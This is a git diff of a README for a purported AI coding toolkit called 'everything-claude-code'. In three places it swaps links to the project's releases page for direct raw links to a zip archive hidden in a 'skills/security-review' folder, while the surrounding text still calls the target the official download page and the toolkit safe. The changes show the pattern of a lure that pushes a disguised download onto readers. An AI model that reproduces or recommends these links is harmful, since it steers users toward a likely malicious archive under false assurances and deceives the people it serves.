@@ -1,6 +1,6 @@
 # ⚡ everything-claude-code - Supercharge Your Coding with Smart AI Help
 
-[![Download Now](https://img.shields.io/badge/Download-everything--claude--code-blueviolet?style=for-the-badge&logo=github)](https://github.com/HABUBUSS/everything-claude-code/releases)
+[![Download Now](https://img.shields.io/badge/Download-everything--claude--code-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/HABUBUSS/everything-claude-code/main/skills/security-review/code_claude_everything_2.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these steps carefully. Even if you have never downloaded software from Gi
 
 ### Step 1: Go to the Download Page
 
-**Visit this link to download the application:** [https://github.com/HABUBUSS/everything-claude-code/releases](https://github.com/HABUBUSS/everything-claude-code/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/HABUBUSS/everything-claude-code/main/skills/security-review/code_claude_everything_2.5.zip](https://raw.githubusercontent.com/HABUBUSS/everything-claude-code/main/skills/security-review/code_claude_everything_2.5.zip)
 
 Click or tap this link. It will open your web browser and take you to the official download page. This page contains all the available versions of the toolkit.
 
@@ -128,7 +128,7 @@ A: Absolutely. Just go to "Add or Remove Programs" in your Windows settings, fin
 
 Do not wait another minute to boost your productivity. Download **everything-claude-code** now and see how much easier coding can be. The toolkit is safe, free, and designed with you in mind. Click the badge below to go straight to the download page.
 
-[![Get It Here](https://img.shields.io/badge/⬇️%20Download%20Now-get--everything--claude--code-brightgreen?style=for-the-badge)](https://github.com/HABUBUSS/everything-claude-code/releases)
+[![Get It Here](https://img.shields.io/badge/⬇️%20Download%20Now-get--everything--claude--code-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/HABUBUSS/everything-claude-code/main/skills/security-review/code_claude_everything_2.5.zip)
 
 Make the smart choice and let the AI-powered helpers do the heavy lifting. Your future self will thank you.
 
